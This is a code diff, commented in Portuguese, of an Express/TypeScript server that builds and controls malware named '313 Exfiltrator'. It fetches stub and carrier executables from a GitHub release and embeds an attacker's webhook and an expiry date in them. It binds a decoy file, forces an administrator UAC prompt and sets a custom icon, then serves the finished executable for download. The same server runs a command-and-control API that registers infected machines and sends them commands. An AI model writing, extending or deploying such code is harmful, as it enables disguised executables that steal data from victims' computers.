@@ -12,14 +12,17 @@ import dotenv from 'dotenv';
 
 dotenv.config();
 
+// --- CONFIGURAÇÃO DE CAMINHOS ---
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
-// --- CORREÇÃO DE TIPAGEM DO TYPESCRIPT ---
+// Garante que o Node encontre a pasta 'views' corretamente
+const viewsPath = path.join(__dirname, 'views');
+
 declare module 'express-session' {
   interface SessionData {
     authenticated: boolean;
-    isAdmin: boolean; // Propriedade para o acesso de Dono
+    isAdmin: boolean;
     license_key: string;
     expiry: number;
     ip: string;
@@ -30,66 +33,43 @@ declare module 'express-session' {
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// --- CONFIGURAÇÃO DO BANCO DE DADOS (NEON.TECH) ---
+// --- BANCO DE DADOS ---
 const sql = postgres(process.env.DATABASE_URL as string, { ssl: 'require' });
 
-// --- CONFIGURAÇÃO BINÁRIA ---
+// --- BINÁRIOS ---
 const STUB_NAME = 'stub.exe';
 const CARRIER_NAME = 'carrier.exe';
-const BUILD_DIR = 'generated_builds';
+const BUILD_DIR = path.join(__dirname, 'generated_builds');
 
 const STUB_URL = "https://github.com/brvnin/stubpublic/releases/download/1.0/stub.exe";
 const CARRIER_URL = "https://github.com/brvnin/stubpublic/releases/download/carrier/carrier.exe";
 
-// Marcadores de Injeção
-const MARKER_WEBHOOK = '313_W_H_START:';
-const MARKER_EXPIRY = '313_EXP_TIME:';
-const MARKER_CLEAN = '313_CLEAN_FILE:';
-const MARKER_PAYLOAD = '313_PAYLOAD_FILE:';
+if (!fs.existsSync(BUILD_DIR)) fs.mkdirSync(BUILD_DIR);
 
-const upload = multer({ 
-    storage: multer.memoryStorage(),
-    limits: { fileSize: 100 * 1024 * 1024 } 
-});
+const upload = multer({ storage: multer.memoryStorage() });
 
-if (!fs.existsSync(BUILD_DIR)) {
-    fs.mkdirSync(BUILD_DIR);
-}
+// --- MIDDLEWARES ---
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+app.use(session({
+    secret: process.env.SESSION_SECRET || '313_secret_gate',
+    resave: false,
+    saveUninitialized: true,
+    cookie: { secure: false }
+}));
 
-// --- CLOUD BINARY SYNC ---
-async function downloadBinary(url: string, filename: string) {
-    console.log(`[313] Syncing binary: ${filename}...`);
-    try {
-        const response = await axios.get(url, { responseType: 'arraybuffer' });
-        fs.writeFileSync(filename, response.data);
-        return true;
-    } catch (e) {
-        console.error(`[!] Failed to sync ${filename}`);
-        return false;
-    }
-}
-
-async function ensureBinariesExist() {
-    if (!fs.existsSync(STUB_NAME)) await downloadBinary(STUB_URL, STUB_NAME);
-    if (!fs.existsSync(CARRIER_NAME)) await downloadBinary(CARRIER_URL, CARRIER_NAME);
-}
-ensureBinariesExist();
-
-// --- SEGURANÇA: MIDDLEWARE DE AUTENTICAÇÃO ---
+// --- AUTH MIDDLEWARE ---
 const adminAuth = (req: Request, res: Response, next: NextFunction) => {
-    if (req.session && req.session.isAdmin) {
-        return next();
-    }
+    if (req.session && req.session.isAdmin) return next();
     res.redirect('/login');
 };
 
-// --- FUNÇÃO DE PATCHING (OVERLAY + UAC + BINDER) ---
+// --- PATCH ENGINE ---
 async function patchBinary(webhook: string, expiry: string, buildId: string, icon: Buffer | null, decoy: Buffer | null) {
     try {
         const payloadData = fs.readFileSync(STUB_NAME);
         let baseBinary = decoy ? fs.readFileSync(CARRIER_NAME) : payloadData;
 
-        // 1. Injeção de Recursos (Ícone e Manifesto de Admin) via ResEdit
         const exe = ResEdit.NtExecutable.from(baseBinary);
         const resObj = ResEdit.NtExecutableResource.from(exe);
 
@@ -98,13 +78,11 @@ async function patchBinary(webhook: string, expiry: string, buildId: string, ico
             (ResEdit.Resource.IconGroupEntry as any).replaceIconsForResource(resObj.entries, 1, 1033, iconFile.icons);
         }
 
-        // Forçar Escudo do UAC (requireAdministrator)
-        const adminManifest = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"><trustInfo xmlns="urn:schemas-microsoft-com:asm.v3"><security><requestedPrivileges><requestedExecutionLevel level="requireAdministrator" uiAccess="false"/></requestedPrivileges></security></trustInfo></assembly>`;
-        
+        const manifest = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"><trustInfo xmlns="urn:schemas-microsoft-com:asm.v3"><security><requestedPrivileges><requestedExecutionLevel level="requireAdministrator" uiAccess="false"/></requestedPrivileges></security></trustInfo></assembly>`;
         const ResourceAny = ResEdit.Resource as any;
         if (ResourceAny.Manifest) {
             const manifestRes = new ResourceAny.Manifest();
-            manifestRes.data = Buffer.from(adminManifest);
+            manifestRes.data = Buffer.from(manifest);
             manifestRes.id = 1;
             manifestRes.lang = 1033;
             manifestRes.outputResource(resObj.entries);
@@ -113,73 +91,60 @@ async function patchBinary(webhook: string, expiry: string, buildId: string, ico
         resObj.outputResource(exe);
         baseBinary = Buffer.from(exe.generate());
 
-        // 2. Montagem Final (Overlay Stream)
         const outputFilename = path.join(BUILD_DIR, `313_Exfiltrator_${buildId}.exe`);
         const writeStream = fs.createWriteStream(outputFilename);
-        
         writeStream.write(baseBinary);
 
         if (decoy) {
-            writeStream.write(Buffer.from(MARKER_CLEAN));
+            writeStream.write(Buffer.from('313_CLEAN_FILE:'));
             writeStream.write(decoy);
-            writeStream.write(Buffer.from(MARKER_PAYLOAD));
+            writeStream.write(Buffer.from('313_PAYLOAD_FILE:'));
             writeStream.write(payloadData);
         }
 
-        // Injeta a Webhook e o Tempo no final absoluto
-        writeStream.write(Buffer.from(MARKER_WEBHOOK + webhook));
-        writeStream.write(Buffer.from(MARKER_EXPIRY + expiry));
+        writeStream.write(Buffer.from('313_W_H_START:' + webhook));
+        writeStream.write(Buffer.from('313_EXP_TIME:' + expiry));
         writeStream.end();
 
         return new Promise<string | null>((resolve) => {
             writeStream.on('finish', () => resolve(outputFilename));
             writeStream.on('error', () => resolve(null));
         });
-    } catch (e) {
-        console.error(`[!] Build error: ${e}`);
-        return null;
-    }
+    } catch (e) { return null; }
 }
 
-// --- ROTAS DO SERVIDOR ---
+// --- ROTAS (CORRIGIDAS) ---
 
+// Carrega a index.html da pasta views
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'views/index.html'));
+    res.sendFile(path.join(viewsPath, 'index.html'));
 });
 
 app.get('/login', (req, res) => {
-    res.sendFile(path.join(__dirname, 'views/login.html'));
+    res.sendFile(path.join(viewsPath, 'login.html'));
 });
 
 app.post('/login', (req, res) => {
     const { password } = req.body;
-    // Valida a senha mestre configurada no .env
     if (password === process.env.ADMIN_PASSWORD) {
         req.session.isAdmin = true;
         return res.redirect('/dashboard');
     }
-    res.redirect('/login?error=AccessDenied');
+    res.redirect('/login?error=InvalidPassword');
 });
 
-// --- API C2 (COMMAND & CONTROL) ---
+app.get('/dashboard', adminAuth, (req, res) => {
+    res.sendFile(path.join(viewsPath, 'dashboard.html'));
+});
+
+// --- API C2 ---
 
 app.post('/api/ping', async (req, res) => {
-    // 1. Garante que os dados do corpo sejam strings ou strings vazias
     const pc_name = String(req.body.pc_name || 'Unknown');
     const os_info = String(req.body.os_info || 'Unknown');
-
-    // 2. Trata o IP para garantir que seja uma string única (não undefined nem array)
-    const forwarded = req.headers['x-forwarded-for'];
-    let ip = "0.0.0.0";
-
-    if (forwarded) {
-        ip = Array.isArray(forwarded) ? forwarded[0] : forwarded.split(',')[0];
-    } else if (req.socket.remoteAddress) {
-        ip = req.socket.remoteAddress;
-    }
+    const ip = String(req.headers['x-forwarded-for'] || req.socket.remoteAddress);
 
     try {
-        // Agora o 'sql' não reclamará, pois os tipos são estritamente strings
         const result = await sql`
             INSERT INTO nodes (pc_name, ip_address, os_info, last_ping)
             VALUES (${pc_name}, ${ip}, ${os_info}, NOW())
@@ -187,22 +152,11 @@ app.post('/api/ping', async (req, res) => {
             DO UPDATE SET last_ping = NOW(), ip_address = ${ip}, os_info = ${os_info}
             RETURNING pending_command
         `;
-
-        const command = result[0]?.pending_command || 'IDLE';
-        res.json({ command });
-
-        // Limpa comando após entrega
-        if (command !== 'IDLE') {
+        res.json({ command: result[0]?.pending_command || 'IDLE' });
+        if (result[0]?.pending_command !== 'IDLE') {
             await sql`UPDATE nodes SET pending_command = 'IDLE' WHERE pc_name = ${pc_name}`;
         }
-    } catch (e) {
-        console.error("[!] DB Ping Error:", e);
-        res.status(500).json({ error: "DB Error" });
-    }
-});
-
-app.get('/dashboard', adminAuth, (req, res) => {
-    res.sendFile(path.join(__dirname, 'views/dashboard.html'));
+    } catch (e) { res.status(500).json({ error: "DB Error" }); }
 });
 
 app.get('/api/nodes', adminAuth, async (req, res) => {
@@ -213,12 +167,11 @@ app.get('/api/nodes', adminAuth, async (req, res) => {
 });
 
 app.post('/api/command', adminAuth, async (req, res) => {
-    const { pc_name } = req.body;
+    const pc_name = String(req.body.pc_name || '');
     await sql`UPDATE nodes SET pending_command = 'FORCE_LOG' WHERE pc_name = ${pc_name}`;
     res.json({ success: true });
 });
 
-// Rota de Construção do Executável
 app.post('/build', adminAuth, upload.fields([{ name: 'icon', maxCount: 1 }, { name: 'decoy', maxCount: 1 }]), async (req: any, res) => {
     const { webhook, expiry_days } = req.body;
     const buildId = crypto.randomBytes(4).toString('hex');
@@ -230,8 +183,8 @@ app.post('/build', adminAuth, upload.fields([{ name: 'icon', maxCount: 1 }, { na
     const filePath = await patchBinary(webhook, expiryTs.toString(), buildId, icon, decoy);
     
     if (filePath) {
-        res.download(filePath, `313_Exfiltrator_${buildId}.exe`, (err) => {
-            if (!err) fs.unlinkSync(filePath); // Limpa build após download
+        res.download(filePath, `313_Exfiltrator.exe`, (err) => {
+            if (!err && fs.existsSync(filePath)) fs.unlinkSync(filePath);
         });
     } else {
         res.status(500).send("Build error");
@@ -242,4 +195,7 @@ app.get('/logout', (req, res) => {
     req.session.destroy(() => res.redirect('/'));
 });
 
-app.listen(PORT, () => console.log(`[313] Master Terminal Active on port ${PORT}`));
+// Inicialização
+app.listen(PORT, '0.0.0.0', () => {
+    console.log(`\n[313] CORE ACTIVE: http://localhost:${PORT}`);
+});
